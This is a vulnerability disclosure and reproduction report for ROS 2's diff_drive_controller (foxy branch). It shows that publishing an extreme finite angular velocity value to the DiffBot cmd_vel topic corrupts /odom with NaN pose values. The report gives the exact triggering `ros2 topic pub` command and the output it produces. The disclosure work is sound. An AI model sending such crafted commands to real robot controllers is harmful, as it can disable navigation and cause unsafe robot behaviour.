# diff_drive_controller / DiffBot NaN odometry reproduction (extreme angular velocity)

## Summary

This document describes a reproducible issue affecting `diff_drive_controller` in the `foxy` branch of `ros-controls/ros2_controllers`.

When the controller receives an **extreme but still finite angular velocity** command, it accepts the command and propagates it into odometry computation. As a result, `/odom` may contain `NaN` position and orientation values.

A representative triggering input is:

- `linear.x = 0.5`
- `angular.z = 8.98846567431158e+307`

Under this input, `/odom.pose.pose.position.x`, `/odom.pose.pose.position.y`, and the odometry orientation quaternion become `NaN`.

## Affected project

- Vendor: `ros-controls`
- Product: `ros2_controllers (diff_drive_controller)`
- Branch / version tested: `foxy`

Reproduction environment uses:

- `ros2_control_demos`
- DiffBot demo

## Vulnerability type

This issue is best described as:

**Missing validation or saturation of extreme angular velocity commands leads to NaN odometry**

This is a semantic correctness / robustness issue. The triggering input is not `NaN`/`INF`, but an extreme finite floating-point value.

## Test environment

- OS: Ubuntu 20.04
- ROS: ROS 2 Foxy
- Target demo: DiffBot
- Launch file: `ros2_control_demo_bringup diffbot_system.launch.py`

## Related repositories

- `ros-controls/ros2_controllers`
- `ros-controls/ros2_control_demos`

## Root cause summary

From source inspection, the controller checks whether incoming command values are finite, but it does not sufficiently reject or saturate extreme finite floating-point values before they influence the control and odometry path.

As a result, an extreme angular velocity command can be accepted and later corrupt odometry output, producing `NaN` position and orientation fields.

## Reproduction steps

### 1. Start DiffBot

```bash
source /opt/ros/foxy/setup.bash
source ~/robolocal/robofuzz/targets/diffbot_ws/install/setup.bash
ros2 launch ros2_control_demo_bringup diffbot_system.launch.py
```

### 2. Confirm the controller is active

```bash
source /opt/ros/foxy/setup.bash
source ~/robolocal/robofuzz/targets/diffbot_ws/install/setup.bash
ros2 control list_controllers
```

Expected output should include:

- `diffbot_base_controller[diff_drive_controller/DiffDriveController] active`
- `joint_state_broadcaster[...] active`

### 3. Publish an extreme but finite angular velocity command

```bash
source /opt/ros/foxy/setup.bash
source ~/robolocal/robofuzz/targets/diffbot_ws/install/setup.bash

ros2 topic pub --rate 10 /diffbot_base_controller/cmd_vel_unstamped geometry_msgs/msg/Twist "
linear:
  x: 0.5
  y: 0.0
  z: 0.0
angular:
  x: 0.0
  y: 0.0
  z: 8.98846567431158e+307"
```

### 4. Observe odometry output

```bash
source /opt/ros/foxy/setup.bash
source ~/robolocal/robofuzz/targets/diffbot_ws/install/setup.bash
ros2 topic echo /odom
```

## Observed result

The odometry output includes `NaN` position and orientation values, for example:

```yaml
header:
  frame_id: odom
child_frame_id: base_link
pose:
  pose:
    position:
      x: .nan
      y: .nan
      z: 0.0
    orientation:
      x: .nan
      y: .nan
      z: .nan
      w: .nan
twist:
  twist:
    linear:
      x: 0.5
    angular:
      z: 8.98846567431158e+307
```

## Expected result

The controller should handle such commands safely by doing one or more of the following:

- reject the command
- saturate or clamp the command to a safe range
- safely degrade without corrupting odometry output

It should not publish `NaN` values in `/odom`.

## Security impact

A system that relies on valid odometry may fail when `/odom` contains `NaN` values. This can break downstream components that depend on finite robot pose and motion state.

Potential impact includes:

- denial of service in higher-level control or navigation logic
- invalid robot state estimation
- unsafe downstream behavior if `NaN` values are not handled correctly

## Suggested CVE wording

> In the `foxy` branch of `ros-controls/ros2_controllers`, `diff_drive_controller` does not properly validate or saturate extreme but finite floating-point angular velocity commands. A crafted angular velocity command can be accepted and propagated through odometry computation, resulting in corrupted odometry output with NaN position and orientation values.

## Credits

Issue reproduced and documented by: `<your name or handle>`

## References

Add links here after publication, for example:

- Source repository
- Demo repository
- Issue tracker entry
- Advisory link